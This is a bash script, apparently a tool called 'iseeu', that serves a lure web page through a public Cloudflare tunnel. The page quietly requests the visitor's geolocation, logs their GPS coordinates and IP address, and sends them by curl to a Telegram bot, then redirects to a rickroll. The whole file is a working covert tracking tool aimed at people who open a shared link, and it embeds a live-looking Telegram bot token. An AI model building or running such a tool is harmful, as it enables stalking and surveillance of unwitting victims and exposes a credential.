#!/bin/bash

clear
read -p "[?] Enter port to use for local server (default 8080): " PORT
PORT=${PORT:-8080}

WEB_DIR="$HOME/webpage"
LOG_DIR="$HOME/iseeu/logs"
TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"
CF_LOG="/tmp/cf_output.log"

TELEGRAM_BOT_TOKEN="7469902610:AAE2ySw1EEMBI1lUP0JmSp_VnLi2Q3oyaJU"
TELEGRAM_CHAT_ID="8155138245"

echo "[*] Killing old servers..."
pkill -f "python3 -m http.server" 2>/dev/null
pkill -f cloudflared 2>/dev/null

mkdir -p "$WEB_DIR" "$LOG_DIR"
> "$LOG_FILE"
> "$CF_LOG"
cd "$WEB_DIR" || exit 1

echo "[*] Creating minimal HTML..."
cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
  <title>I See You</title>
  <script>
    navigator.geolocation.getCurrentPosition(pos => {
      const loc = pos.coords.latitude + "," + pos.coords.longitude;
      fetch("/logme/" + loc);
      location.href = "https://shattereddisk.github.io/rickroll/rickroll.mp4";
    }, () => {
      alert("Location access denied.");
    });
  </script>
</head>
<body><h1>Loading...</h1></body>
</html>
EOF

echo "[*] Starting HTTP server on port $PORT..."
python3 -m http.server "$PORT" > /dev/null 2>&1 &
SERVER_PID=$!

echo "[*] Starting Cloudflared tunnel..."
cloudflared tunnel --url "http://localhost:$PORT" --logfile "$CF_LOG" > /dev/null 2>&1 &
CF_PID=$!

echo -n "[*] Waiting for Cloudflared URL"
for i in {1..10}; do
  sleep 1
  echo -n "."
  URL=$(grep -oE "https://[a-zA-Z0-9.-]+\.trycloudflare\.com" "$CF_LOG" | head -n1)
  [[ -n "$URL" ]] && break
done
echo

if [[ -n "$URL" ]]; then
  echo "[✓] Public URL: $URL"
else
  echo "[✗] Failed to get public URL."
  kill $SERVER_PID $CF_PID 2>/dev/null
  exit 1
fi

echo "[*] Logging to $LOG_FILE..."

# Passive GPS/IP logging server
while true; do
  { echo -ne "HTTP/1.1 204 No Content\r\n\r\n"; } | nc -l -p "$PORT" | while read line; do
    if [[ "$line" == *"/logme/"* ]]; then
      GPS=$(echo "$line" | cut -d' ' -f2 | cut -d'/' -f3)
      IP=$(echo "$line" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
      LOG="[$(date)] GPS: $GPS | IP: $IP"
      echo "$LOG" >> "$LOG_FILE"

      curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
        -d "chat_id=$TELEGRAM_CHAT_ID" \
        -d "text=$LOG" > /dev/null
    fi
  done
done &

trap 'echo "[*] Cleaning up..."; kill $SERVER_PID $CF_PID; rm -f "$CF_LOG"; echo "[*] Done."' EXIT

echo "[*] Press Ctrl+C to stop."
wait